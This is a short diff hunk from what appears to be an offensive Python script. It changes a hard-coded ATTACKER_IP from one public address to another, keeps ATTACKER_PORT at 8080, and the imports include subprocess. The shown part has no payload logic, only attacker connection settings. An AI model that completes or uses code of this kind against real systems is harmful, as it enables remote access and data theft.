@@ -5,7 +5,7 @@ import subprocess
 import time
 import os
 
-ATTACKER_IP = '35.238.26.132' # change this to the attacker's IP address
+ATTACKER_IP = '104.154.143.174' # change this to the attacker's IP address
 ATTACKER_PORT = 8080
 
 # Data is a dict
